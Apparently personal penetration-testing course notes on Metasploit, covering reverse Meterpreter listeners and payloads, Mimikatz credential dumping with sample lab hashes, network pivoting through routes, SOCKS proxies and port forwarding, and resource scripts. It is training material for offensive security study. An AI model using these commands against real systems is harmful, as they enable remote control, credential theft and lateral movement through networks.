

### Standard listener
```
set payload METERPRETER_PAYLOAD  // meterpreter/ payloads
set LHOST 0.0.0.0
set LPORT 4444
run -j  // Run in background
```



Types of MSF exploits:

| Type      | Explanation                                                                      |
| --------- | -------------------------------------------------------------------------------- |
| Auxiliary | Auxiliary modules don't exploit, but they can scan, modify, crack passwords etc. |
| Exploit   | Get RCE                                                                          |
| Payload   | Create payloads for other modules                                                |
|           |                                                                                  |
Example search: 
```
search type:auxiliary ssh
```

##### Workspaces
```
msfdb init             // Initialize the MSF database

workspace -a pen-200   // create a workspace
workspace pen-200      // Attach to a workspace
worspace -d pen-200    // Delete a workspace
```


To get the IP address and ports into the MSF datbase, use:
```
db_nmap -A IP_ADDR
hosts // will display the IP handled before
services // will display the services the NMAP scan foud.
services -p 8000
```

### payloads
See [[msfvenom]].
To show payloads:
```
show payloads
use X
```
##### Staged vs non-staged payloads
Note the /
```
Staged:
payload/linux/x64/meterpreter/bind_tcp                             normal  No     Linux Mettle x64, Bind TCP Stager
payload/linux/x64/meterpreter/reverse_sctp                         normal  No     Linux Mettle x64, Reverse SCTP Stager
payload/linux/x64/meterpreter/reverse_tcp                          normal  No     Linux Mettle x64, Reverse TCP Stager

Non-staged:
payload/linux/x64/meterpreter_reverse_http                         normal  No     Linux Meterpreter, Reverse HTTP Inline
payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
payload/linux/x64/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
```

Note: make sure to use this for `exploit/multi/handler`



### Post-exploitation

Getting system privileges
```
getuid
```
###### Example
```
(Meterpreter 5)(C:\Users\luiza) > getuid
Server username: ITWK01\luiza
(Meterpreter 5)(C:\Users\luiza) > getsystem
[-] Already running as SYSTEM
(Meterpreter 5)(C:\Users\luiza) > getuid
Server username: NT AUTHORITY\SYSTEM
(Meterpreter 5)(C:\Users\luiza) > 

```


Loading Mimikatz and obtaining hashes:
```
load kiwi
creds_msv
```
###### Example
```
(Meterpreter 6)(C:\Users\luiza) > load kiwi        
Loading extension kiwi...                  
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)  
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
    
Success.
(Meterpreter 6)(C:\Users\luiza) > creds_msv  
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============

Username  Domain  NTLM                              SHA1
--------  ------  ----                              ----
luiza     ITWK01  167cf9218719a1209efcfb4bce486a18  2f92bb5c2a2526a630122ea1b642c46193a0d837
offsec    ITWK01  1c3fb240ae45a2dc5951a043cf47040e  a914116eb78bec73deb3819546426c2f6bd80bbd

```


#### Pivoting
Scanning other IPs
```
ipconfig
// Check the internal IP (Ethernet adapter IPv4 Address)

// If in a Meterpreter session 
background

// Use the IP from the previous step, replacing the last octet with a 0. This will enable Metasploit to use the IP as a target, and the sessoin to target it to.
route add INTERNAL_IP /24 SESSION_ID
// To check
route print

use auxiliary/scanner/portscan/tcp
set RHOSTS TARGET_INTERNAL_IP_ADDRESS
set PORTS TARGET_PORTS                 // Suggester: 445, 3389. If the SMB ports are open, use exploit/windows/smb/psexec with the known credentials.
run
```

Instead of adding manual routes, `autoroute` can be used too:
```
use multi/manage/autoroute
sessions -l 
set session SESSION_ID
run
```


First, make sure that the `/etc/proxychains.conf` port is set to `1080`.

```
// If in a Meterpreter session:
background

// Setting up the proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
run -j

// Regular commands can now be ran
proxychains xfreerdp /v:172.16.5.200 /u:luiza

```

##### Port forwarding in a Meterpreter session

Portfwd will create a local TCP relay of a remote port.
```
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.
```

```
sessions -i SESSION_TO_ENTER
portfwd -h


portfwd add -l 3389 -p 3389 -r 172.16.5.200

xfreerdp /v:127.0.0.1 /u:USER
```

#### Automation
Using Metasploit *Recourse Scripts*, exploits can be chained together, managed more easily, or otherwise handled more conveniently.
To list them:
```
ls -l /usr/share/metasploit-framework/scripts/resource
```

##### Example output
```
┌─[root@edu-virtualbox]─[/tmp/oscp]
└──╼ #ls -l /usr/share/metasploit-framework/scripts/resource
total 156
-rw-r--r-- 1 root root  7270 22 nov 23:09 auto_brute.rc
-rw-r--r-- 1 root root  2203 22 nov 23:09 autocrawler.rc
-rw-r--r-- 1 root root 11225 22 nov 23:09 auto_cred_checker.rc
-rw-r--r-- 1 root root  6565 22 nov 23:09 autoexploit.rc
-rw-r--r-- 1 root root  3422 22 nov 23:09 auto_pass_the_hash.rc
-rw-r--r-- 1 root root   876 22 nov 23:09 auto_win32_multihandler.rc
-rw-r--r-- 1 root root   155 22 nov 23:09 bap_all.rc
-rw-r--r-- 1 root root   762 22 nov 23:09 bap_dryrun_only.rc
-rw-r--r-- 1 root root   365 22 nov 23:09 bap_firefox_only.rc
-rw-r--r-- 1 root root   358 22 nov 23:09 bap_flash_only.rc
-rw-r--r-- 1 root root   354 22 nov 23:09 bap_ie_only.rc
-rw-r--r-- 1 root root 20767 22 nov 23:09 basic_discovery.rc
-rw-r--r-- 1 root root  4518 22 nov 23:09 dev_checks.rc
-rw-r--r-- 1 root root  3358 22 nov 23:09 fileformat_generator.rc
-rw-r--r-- 1 root root  1319 22 nov 23:09 meterpreter_compatibility.rc
-rw-r--r-- 1 root root  1064 22 nov 23:09 mssql_brute.rc
-rw-r--r-- 1 root root  4346 22 nov 23:09 multi_post.rc
-rw-r--r-- 1 root root  1222 22 nov 23:09 nessus_vulns_cleaner.rc
-rw-r--r-- 1 root root  1659 22 nov 23:09 oracle_login.rc
-rw-r--r-- 1 root root   840 22 nov 23:09 oracle_sids.rc
-rw-r--r-- 1 root root   490 22 nov 23:09 oracle_tns.rc
-rw-r--r-- 1 root root   833 22 nov 23:09 port_cleaner.rc
-rw-r--r-- 1 root root  2419 22 nov 23:09 portscan.rc
-rw-r--r-- 1 root root  1251 22 nov 23:09 run_all_post.rc
-rw-r--r-- 1 root root   333 22 nov 23:09 run_cve-2022-22960_lpe.rc
-rw-r--r-- 1 root root  3084 22 nov 23:09 smb_checks.rc
-rw-r--r-- 1 root root  3837 22 nov 23:09 smb_validate.rc
-rw-r--r-- 1 root root  2592 22 nov 23:09 wmap_autotest.rc
```

To use a script:
```
set AutoRunScript AUTORUNSCRIPT
```
##### Custom rc creation
test.rc:
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate              // Will create a notepad.exe process and migrade to it, to prevent the session from being killed.
set ExitOnSession false                                    // Be able to handle multiple sessions
```
To use:
```
msfconsole -r test.rc
```


### Error handling
```
[-] Exploit failed [unreachable]: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=192.168.187.225:8080 state=error: wrong version number
```
use
```
set SSL false
```
